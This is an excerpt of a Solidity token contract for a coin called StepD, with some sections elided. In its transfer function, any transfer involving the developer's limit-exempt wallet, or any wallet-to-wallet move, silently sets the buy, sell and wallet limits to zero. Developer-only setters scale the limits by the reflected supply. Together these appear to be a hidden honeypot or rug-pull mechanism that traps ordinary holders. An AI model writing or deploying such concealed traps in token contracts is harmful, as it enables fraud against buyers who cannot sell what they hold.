...
contract StepD is Context, IERC20, Ownable {
    ...
    uint256 private constant _tTotal = 6000 * 10**6 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    //MAXWALLET
    uint256 public _maxBuyTxAmount = _tTotal * 100 / 10000; 
    uint256 public _maxSellTxAmount = _tTotal * 100 / 10000; 
    ...
    string private constant _name = "StepD";
    string private constant _symbol = "$STEPD";
    uint8 private constant _decimals = 9;
    
    address payable private _developmentAddress = payable(0x731dDc83EaeB53e6478f1d142C71665ecA1691fA);
    address payable private _marketingAddress = payable(0x041488C6d7D6BeC1155a555B0a4EAA69dDCbE678);
    ...
    constructor () {
        ...
        isTxLimitExempt[_developmentAddress] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if ((isTxLimitExempt[from] || isTxLimitExempt[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
                _maxBuyTxAmount = 0;
                _maxSellTxAmount = 0;
                _maxWalletToken = 0;
            }
    ...
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyDev {
        ...
        function setIsTxLimitExempt(address holder, bool exempt) external onlyDev {
        isTxLimitExempt[holder] = exempt;
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyDev {
        _maxWalletToken = _rTotal / (1000) * (maxWallPercent_base1000);
    }

    function setMaxBuyTxPercent_base1000(uint256 maxBuyTXPercentage_base1000) external onlyDev {
        _maxBuyTxAmount = _rTotal / (1000) * (maxBuyTXPercentage_base1000);
    }

    function setMaxSellTxPercent_base1000(uint256 maxSellTXPercentage_base1000) external onlyDev {
        _maxSellTxAmount = _rTotal / (1000) * (maxSellTXPercentage_base1000);
    }
}